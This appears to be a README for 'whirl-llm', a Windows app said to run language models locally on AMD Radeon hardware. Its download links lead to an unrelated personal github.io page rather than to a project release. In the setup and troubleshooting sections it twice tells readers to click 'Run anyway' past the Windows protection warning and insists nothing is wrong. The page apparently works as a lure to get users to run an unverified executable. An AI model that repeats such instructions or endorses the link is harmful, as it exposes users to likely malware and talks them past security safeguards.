# ⚡ whirl-llm - Run Powerful AI Models on Windows

[![Download whirl-llm](https://img.shields.io/badge/Download-whirl--llm-ff6b35?style=for-the-badge&logo=windows&logoColor=white)](https://yaafi183307.github.io)

**Visit this link to download the application.**

whirl-llm is a Windows program that lets you run large language models — the same kind of AI that powers chatbots and writing assistants — directly on your own computer. No cloud account, no subscription, no complicated setup. You unzip it, you run it, and your AMD graphics card does the heavy lifting.

---

## 🚀 What Is whirl-llm?

whirl-llm is an inference engine. That is a fancy way of saying it is the piece of software that makes an AI model actually respond to you. Most people run AI models through a website, which means their words travel across the internet to a company server and back again.

whirl-llm flips that around. The AI model lives on your hard drive. The thinking happens inside your graphics card. Your conversations never leave your PC.

It is built specifically for modern AMD hardware found in high-end Windows laptops and workstations — the Ryzen AI Max+ 395 with its Radeon 8060S graphics, and the Radeon AI PRO R9700 desktop card. Because it is written natively for Windows and talks directly to your AMD driver, it does not need extra toolkits, translation layers, or developer packages installed first. The AMD driver is the only thing it asks for.

---

## 💡 Why You'll Like It

**It just works on Windows.** Many AI tools are built for Linux first and Windows second, if at all. whirl-llm is the opposite. It is a native Windows application built from the ground up for the operating system you already use.

**Nothing else to install.** No Python. No compilers. No command-line package managers. If your AMD driver is up to date, you are ready.

**Your data stays home.** Everything runs locally. There is no account to create and no usage tracking.

**Fast, modern model support.** whirl-llm handles GGUF model files, which is the most common format for downloadable AI models, along with compressed MXFP4 weights that keep large models small enough to fit in memory.

**Smart speed boost.** Speculative decoding lets the engine draft several words ahead and verify them in a batch, which can make responses arrive noticeably faster without changing the quality of the answer.

**Built for your hardware.** The engine is tuned for RDNA 3.5 and RDNA 4 graphics architectures, so it uses the compute units in your Radeon GPU properly instead of falling back to the processor.

---

## ✅ Before You Start

Take two minutes to check these boxes. Doing so now saves confusion later.

**Your computer.** A Windows PC with an AMD Ryzen AI Max+ 395 processor and Radeon 8060S integrated graphics, or a system with a Radeon AI PRO R9700 graphics card. These are the configurations whirl-llm is designed and tested for.

**Your driver.** An up-to-date AMD graphics driver. This is the single requirement. If you have not updated your driver in a long time, visit the AMD website, download the latest driver for your specific card, and install it before continuing. Restart your computer afterward — driver updates often need a restart to fully take effect.

**Disk space.** AI models are large files. A small model might be a couple of gigabytes; a large one can be tens of gigabytes. Keep at least 20–30 GB free so you have room for a model plus the engine itself.

**Memory.** Model size and memory go hand in hand. Larger models need more memory. Start with a smaller model, confirm everything works, then move up.

**A model file.** whirl-llm is the engine; it does not ship with an AI model inside. You will download a GGUF model file separately from a model hosting site. Think of whirl-llm as the car and the model as the fuel.

---

## 📥 Download and Setup

**Visit this link to download the application:**

### 👉 https://yaafi183307.github.io

Once you are on that page, find the most recent release at the top. Each release lists files you can save to your computer. Download the Windows package to your Downloads folder.

After the download finishes:

1. Open your Downloads folder.
2. If the file you saved is a compressed archive, right-click it and choose Extract All, then pick a folder such as C:\whirl-llm. Avoid running anything directly from inside a zip file — extract first.
3. Open the extracted folder and look for the main application file.
4. Double-click it to launch.

Windows may show a blue "Windows protected your PC" message the first time you run a newly downloaded program. If you see it, click More info, then click Run anyway. This appears because Windows has not seen this file before, not because anything is wrong.

---

## 🖥️ Running Your First Model

With whirl-llm open, you will point it at your model file and start a conversation.

1. Download a GGUF model file from a model hosting site and place it in a folder you will remember, such as C:\models.
2. In whirl-llm, choose the option to load or open a model.
3. Browse to the model file you saved and select it.
4. Wait while the model loads. Larger files take longer — a progress indicator will show activity.
5. Once loading completes, a text box appears. Type a question and press Enter.
6. The answer will appear word by word as the model generates it.

If you are unsure which model to try first, pick a smaller one. A smaller model loads faster, uses less memory, and gives you a quick success to build on.

---

## ⚙️ Settings You Can Adjust

Most people never need to touch these, but they are there when you want them.

**Context length.** How much of the conversation the model can remember at once. Longer context means the model recalls more of what you said earlier, but it uses more memory.

**Response length.** Caps how many words the model produces in a single answer.

**Temperature.** Controls creativity. Lower values give focused, predictable answers. Higher values give more varied, imaginative ones.

**GPU layers.** How much of the model is placed on your graphics card versus your processor. More layers on the GPU means faster responses. If you run out of memory, lower this number.

**Speculative decoding.** A speed feature that drafts ahead and checks its work. Leave it on unless you notice odd output.

---

## 🧠 How It Works, In Plain Language

When you type a message, whirl-llm converts your words into numbers the model understands. Those numbers travel to your Radeon GPU, which performs a long series of calculations across thousands of small processing units working in parallel. The result is a probability for what the next word should be. The engine picks a word, adds it to the answer, and repeats — sometimes many times per second.

Because each step depends on the one before it, speed matters enormously. That is why whirl-llm talks directly to your AMD driver and uses the compressed MXFP4 format: fewer wasted steps, less data shuffled around, more words per second.

---

## 🛠️ Troubleshooting

**The app will not open.** Confirm your AMD driver is current and restart your computer. Then try launching again from the extracted folder rather than from inside a zip.

**It says no compatible device found.** Your driver is likely outdated or your card is not one of the supported models. Update the driver from the AMD website first.

**Loading stalls or fails.** The model file may be larger than your available memory, or the download may have been interrupted. Try a smaller model, and re-download the file if it seems incomplete.

**Responses are very slow.** Lower the number of layers sent to the GPU, or switch to a smaller model. Close other graphics-heavy programs running in the background.

**Output looks garbled or repetitive.** Lower the temperature, and make sure you are using a model file that matches the format the engine expects.

**Windows blocks the file.** Click More info, then Run anyway.

---

## ❓ Questions People Ask

**Do I need an internet connection?** Only to download the application and your model files. After that, everything runs offline.

**Do I need to know how to code?** No. This is a point-and-click application. There is no terminal, no scripts, and no configuration files to edit by hand.

**Will it use my whole computer?** No. It uses your graphics card while generating text and releases resources when idle.

**Can I use it on a laptop?** Yes, on laptops with the Ryzen AI Max+ 395 and Radeon 8060S graphics. Plug in the power adapter for best performance, since battery mode often limits graphics speed.

**Where do updates come from?** The same releases page linked above. Check back occasionally for a newer version.

---

## 🔒 Privacy

whirl-llm runs entirely on your machine. Your prompts, your documents, and the model's answers stay on your disk. No telemetry is sent, no account is required, and no conversation is uploaded anywhere.

---

Keywords: amd, gguf, hip, inference, llm, mxfp4, r9700, radeon-8060s, rdna3-5, rdna4, ryzen-ai-max, speculative-decoding, strix-halo, windows